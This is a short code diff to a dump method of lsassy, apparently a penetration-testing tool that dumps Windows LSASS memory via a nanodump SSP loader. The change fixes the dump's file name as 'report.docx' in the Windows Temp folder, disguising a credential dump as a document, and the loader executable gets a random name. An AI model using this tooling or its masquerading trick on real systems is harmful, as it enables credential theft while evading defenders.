@@ -11,6 +11,13 @@ from lsassy.dumpmethod import IDumpMethod, Dependency
 
 
 class DumpMethod(IDumpMethod):
+    
+    custom_dump_path_support = False
+    custom_dump_name_support = False
+    
+    dump_name              = "report.docx"
+    dump_path              = "\\Windows\\Temp\\"
+    
     def __init__(self, session, timeout):
         super().__init__(session, timeout)
         self.load_ssp = Dependency("load_ssp", ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + ".exe")
@@ -26,8 +33,6 @@ class DumpMethod(IDumpMethod):
         self.clean_dependencies([self.load_ssp, self.nanodump_ssp])
 
     def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
-        # dump_path = "\\Windows\Temp\\"
-        # dump_name = "report.docx"
 
         cmd_command = """{} C:{}""".format(
             self.load_ssp.get_remote_path(),
